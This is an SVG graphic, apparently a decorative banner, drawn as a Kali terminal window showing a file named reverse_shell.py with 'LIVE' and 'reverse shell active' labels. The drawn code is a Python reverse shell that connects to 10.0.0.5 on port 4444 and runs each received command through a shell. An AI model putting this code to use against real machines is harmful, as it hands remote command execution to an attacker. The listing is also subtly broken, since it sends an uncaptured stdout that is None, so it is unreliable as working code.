<svg xmlns="http://www.w3.org/2000/svg" width="780" height="300" viewBox="0 0 780 300">
  <!-- Outer glow frame -->
  <rect x="8" y="8" width="764" height="284" rx="14" fill="#0d1117" stroke="#FF6A00" stroke-width="2"/>
  <rect x="11" y="11" width="758" height="278" rx="11" fill="none" stroke="#FFB347" stroke-width="1" opacity="0.35"/>

  <!-- Title bar -->
  <rect x="10" y="10" width="760" height="34" rx="10" fill="#161b22"/>
  <circle cx="32" cy="27" r="6" fill="#ff5f56"/>
  <circle cx="52" cy="27" r="6" fill="#ffbd2e"/>
  <circle cx="72" cy="27" r="6" fill="#27c93f"/>
  <text x="390" y="32" text-anchor="middle" font-family="monospace" font-size="13" fill="#8b949e">root@kali — reverse_shell.py</text>
  <text x="735" y="32" text-anchor="middle" font-family="monospace" font-size="12" fill="#FF6A00">● LIVE</text>

  <!-- Line numbers -->
  <g font-family="monospace" font-size="14" fill="#3d444d">
    <text x="30" y="78">1</text>
    <text x="30" y="102">2</text>
    <text x="30" y="126">3</text>
    <text x="30" y="150">4</text>
    <text x="30" y="174">5</text>
    <text x="30" y="198">6</text>
    <text x="30" y="222">7</text>
  </g>

  <!-- Line 1: import socket, subprocess, os -->
  <g font-family="monospace" font-size="14">
    <text x="60" y="78" fill="#ff7b72">import</text>
    <text x="120" y="78" fill="#79c0ff">socket</text>
    <text x="185" y="78" fill="#ff7b72">,</text>
    <text x="195" y="78" fill="#79c0ff">subprocess</text>
    <text x="295" y="78" fill="#ff7b72">,</text>
    <text x="305" y="78" fill="#79c0ff">os</text>
  </g>

  <!-- Line 2: s = socket.socket(...) -->
  <g font-family="monospace" font-size="14">
    <text x="60" y="102" fill="#79c0ff">s</text>
    <text x="75" y="102" fill="#ff7b72">=</text>
    <text x="90" y="102" fill="#79c0ff">socket</text>
    <text x="150" y="102" fill="#ffa657">.socket</text>
    <text x="215" y="102" fill="#ffa657">(socket.AF_INET, socket.SOCK_STREAM)</text>
  </g>

  <!-- Line 3: s.connect(("10.0.0.5", 4444)) -->
  <g font-family="monospace" font-size="14">
    <text x="60" y="126" fill="#79c0ff">s</text>
    <text x="75" y="126" fill="#ffa657">.connect</text>
    <text x="150" y="126" fill="#ffa657">((</text>
    <text x="170" y="126" fill="#a5d6ff">"10.0.0.5"</text>
    <text x="245" y="126" fill="#ffa657">,</text>
    <text x="255" y="126" fill="#79c0ff">4444</text>
    <text x="290" y="126" fill="#ffa657">))</text>
  </g>

  <!-- Line 4: while True: -->
  <g font-family="monospace" font-size="14">
    <text x="60" y="150" fill="#ff7b72">while</text>
    <text x="115" y="150" fill="#79c0ff">True</text>
    <text x="160" y="150" fill="#ff7b72">:</text>
  </g>

  <!-- Line 5: cmd = s.recv(1024).decode() -->
  <g font-family="monospace" font-size="14">
    <text x="90" y="174" fill="#79c0ff">cmd</text>
    <text x="130" y="174" fill="#ff7b72">=</text>
    <text x="145" y="174" fill="#79c0ff">s</text>
    <text x="160" y="174" fill="#ffa657">.recv</text>
    <text x="215" y="174" fill="#ffa657">(1024)</text>
    <text x="270" y="174" fill="#ffa657">.decode</text>
    <text x="335" y="174" fill="#ffa657">()</text>
  </g>

  <!-- Line 6: out = subprocess.run(cmd, shell=True) -->
  <g font-family="monospace" font-size="14">
    <text x="90" y="198" fill="#79c0ff">out</text>
    <text x="125" y="198" fill="#ff7b72">=</text>
    <text x="140" y="198" fill="#79c0ff">subprocess</text>
    <text x="225" y="198" fill="#ffa657">.run</text>
    <text x="270" y="198" fill="#ffa657">(cmd, shell=True)</text>
  </g>

  <!-- Line 7: s.send(out.stdout) -->
  <g font-family="monospace" font-size="14">
    <text x="90" y="222" fill="#79c0ff">s</text>
    <text x="105" y="222" fill="#ffa657">.send</text>
    <text x="160" y="222" fill="#ffa657">(</text>
    <text x="170" y="222" fill="#79c0ff">out.stdout</text>
    <text x="260" y="222" fill="#ffa657">)</text>
  </g>

  <!-- Static cursor -->
  <text x="300" y="222" font-family="monospace" font-size="14" fill="#FF6A00">▌</text>

  <!-- Static status bar -->
  <rect x="40" y="245" width="700" height="22" rx="6" fill="#161b22"/>
  <text x="390" y="261" text-anchor="middle" font-family="monospace" font-size="12" fill="#FFB347">═══ shell connected · reverse shell active ═══</text>
</svg>
